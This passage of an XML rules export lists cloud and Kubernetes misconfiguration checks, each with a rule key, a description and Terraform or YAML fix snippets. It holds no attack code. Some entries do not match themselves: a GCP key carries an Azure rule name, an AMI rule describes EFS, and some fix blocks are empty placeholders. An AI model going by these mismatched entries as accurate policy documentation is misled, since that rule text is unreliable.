      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-rds-log-audit-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-rds-log-audit-is-disabled"></div>Alibaba Cloud RDS log audit is disabled</div><a aria-label="Skip link to Alibaba Cloud RDS log audit is disabled" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-rds-log-audit-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-log-audit-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-log-audit-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-rds-log-audit-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_3</key>
    <name>Do not admit containers wishing to share host IPC namespace</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-wishing-to-share-host-ipc-namespace-admitted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-wishing-to-share-host-ipc-namespace-admitted"></div>Containers wishing to share host IPC namespace admitted</div><a aria-label="Skip link to Containers wishing to share host IPC namespace admitted" class="heading-anchor-icon fa fa-anchor" href="#containers-wishing-to-share-host-ipc-namespace-admitted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The host IPC namespace controls whether a pod's containers can be shared. You can administer cluster-level restrictions to ensure that containers remain isolated using <strong>PodSecurityPolicy</strong> and ensuring <strong>hostIPC</strong> is set to <strong>False</strong>. </p>
<p>Preventing sharing of host <strong>PID/IPC</strong> namespace, networking, and ports ensures proper isolation between Docker containers and the underlying host.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Argument</strong>: hostIPC<br/>
Determines if the policy allows the use of HostIPC in the pod spec.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
+ hostIPC: false
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource, the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>A <strong>Role</strong> or <strong>ClusterRole</strong> must grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole </strong>is then bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_249</key>
    <name>Ensure AWS AppSync has field-level logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-appsync-has-field-level-logs-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-app-sync-has-field-level-logs-disabled"></div>AWS AppSync has field-level logs disabled</div><a aria-label="Skip link to AWS AppSync has field-level logs disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-appsync-has-field-level-logs-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-appsync-has-field-level-logs-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_75</key>
    <name>Ensure Azure built-in logging for Azure function app is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-built-in-logging-for-azure-function-app-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-built-in-logging-for-azure-function-app-is-disabled"></div>Azure Built-in logging for Azure function app is disabled</div><a aria-label="Skip link to Azure Built-in logging for Azure function app is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-built-in-logging-for-azure-function-app-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="runtime---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-runtime-buildtime"></div>Runtime - Buildtime </div><a aria-label="Skip link to Runtime - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#runtime---buildtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_159</key>
    <name>Ensure Azure built-in logging for Azure function app is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-built-in-logging-for-azure-function-app-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-built-in-logging-for-azure-function-app-is-disabled"></div>Azure Built-in logging for Azure function app is disabled</div><a aria-label="Skip link to Azure Built-in logging for Azure function app is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-built-in-logging-for-azure-function-app-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="runtime---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-runtime-buildtime"></div>Runtime - Buildtime </div><a aria-label="Skip link to Runtime - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#runtime---buildtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-built-in-logging-for-azure-function-app-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_105</key>
    <name>Ensure GCP DataFusion has stack driver monitoring enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-datafusion-does-not-have-stack-driver-monitoring-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-data-fusion-does-not-have-stack-driver-monitoring-enabled"></div>GCP DataFusion does not have stack driver monitoring enabled</div><a aria-label="Skip link to GCP DataFusion does not have stack driver monitoring enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-datafusion-does-not-have-stack-driver-monitoring-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-monitoring-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-monitoring-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gcp-datafusion-has-stack-driver-monitoring-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GLB_2</key>
    <name>Ensure Gitlab branch protection rules do not allow force pushes</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gitlab-branch-protection-rules-force-push-is-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gitlab-branch-protection-rules-force-push-is-enabled"></div>Gitlab branch protection rules force push is enabled</div><a aria-label="Skip link to Gitlab branch protection rules force push is enabled" class="heading-anchor-icon fa fa-anchor" href="#gitlab-branch-protection-rules-force-push-is-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitLab, permissions are fundamentally defined around the idea of having read or write permission to the repository and branches. To impose further restrictions on certain branches, they can be protected.</p>
<p>When you perform more complex operations, for example, squash commits, reset or rebase your branch, you must force an update to the remote branch. These operations imply rewriting the commit history of the branch. Forcing an update is not recommended when you&#8217;re working on shared branches.</p>
<p>You can enable force push on a protected branch, but this is ill-advised.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: gitlab_branch_protection</li>
<li>Attribute: allow_force_push</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "gitlab_branch_protection" "BranchProtect" {
...
-  allow_force_push             = true
+  allow_force_push             = false
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-gitlab-branch-protection-rules-does-not-allow-force-pushes' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_199</key>
    <name>Ensure AWS Image Builder Distribution Configuration is encrypting AMI by Key Management Service (KMS) using a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-image-builder-distribution-configuration-is-not-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-image-builder-distribution-configuration-is-not-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk"></div>AWS Image Builder Distribution Configuration is not encrypting AMI by Key Management Service (KMS) using a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS Image Builder Distribution Configuration is not encrypting AMI by Key Management Service (KMS) using a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-image-builder-distribution-configuration-is-not-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="resource-aws_imagebuilder_distribution_configuration"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-resource-aws-imagebuilder-distribution-configuration"></div>Resource: aws_imagebuilder_distribution_configuration</div><a aria-label="Skip link to Resource: aws_imagebuilder_distribution_configuration" class="heading-anchor-icon fa fa-anchor" href="#resource-aws_imagebuilder_distribution_configuration"></a></h2>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="arguments-distributionami_distribution_configurationkms_key_id"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-arguments-distribution-ami-distribution-configuration-kms-key-id"></div>Arguments: distribution.ami_distribution_configuration.kms_key_id </div><a aria-label="Skip link to Arguments: distribution.ami_distribution_configuration.kms_key_id " class="heading-anchor-icon fa fa-anchor" href="#arguments-distributionami_distribution_configurationkms_key_id"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_imagebuilder_distribution_configuration" "pass" {
  name        = "example"
  description = "non empty value"

  distribution {
    ami_distribution_configuration {
      kms_key_id = aws_kms_key.fail.arn
      ami_tags = {
        CostCenter = "IT"
      }

      name = "example-{{ imagebuilder:buildDate }}"

      launch_permission {
        user_ids = ["123456789012"]
      }
    }

    region = "us-east-1"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-image-builder-distribution-configuration-is-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-image-builder-distribution-configuration-is-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-image-builder-distribution-configuration-is-encrypting-ami-by-key-management-service-kms-using-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_ALI_24</key>
    <name>Ensure Alibaba Cloud RAM enforces MFA</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="alibaba-cloud-ram-does-not-enforce-mfa"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-alibaba-cloud-ram-does-not-enforce-mfa"></div>Alibaba Cloud RAM does not enforce MFA</div><a aria-label="Skip link to Alibaba Cloud RAM does not enforce MFA" class="heading-anchor-icon fa fa-anchor" href="#alibaba-cloud-ram-does-not-enforce-mfa"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-enforces-mfa' target='_blank'> https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-enforces-mfa</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-alibaba-cloud-ram-enforces-mfa' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_236</key>
    <name>Ensure AWS AMI copying uses a Customer Managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-ami-copying-does-not-use-a-customer-managed-key-cmk"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-ami-copying-does-not-use-a-customer-managed-key-cmk"></div>AWS AMI copying does not use a Customer Managed Key (CMK)</div><a aria-label="Skip link to AWS AMI copying does not use a Customer Managed Key (CMK)" class="heading-anchor-icon fa fa-anchor" href="#aws-ami-copying-does-not-use-a-customer-managed-key-cmk"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This policy identifies AMI copies which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer-managed KMS Keys to encrypt your AMI copies data. It gives you full control over the encrypted data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ami_copy" "pass" {
  name              = "terraform-example"
  description       = "A copy of ami-xxxxxxxx"
  source_ami_id     = "ami-xxxxxxxx"
  source_ami_region = "us-west-1"
  encrypted         = true #default is false
  kms_key_id        = aws_kms_key.copy.arn
  tags = {
    Name = "HelloWorld"
    test = "failed"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-ami-copying-uses-a-customer-managed-key-cmk' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-ami-copying-uses-a-customer-managed-key-cmk</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-ami-copying-uses-a-customer-managed-key-cmk' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_244</key>
    <name>Ensure AWS MWAA environment has webserver logs enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-mwaa-environment-has-webserver-logs-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-mwaa-environment-has-webserver-logs-disabled"></div>AWS MWAA environment has webserver logs disabled</div><a aria-label="Skip link to AWS MWAA environment has webserver logs disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-mwaa-environment-has-webserver-logs-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-webserver-logs-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-mwaa-environment-has-webserver-logs-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
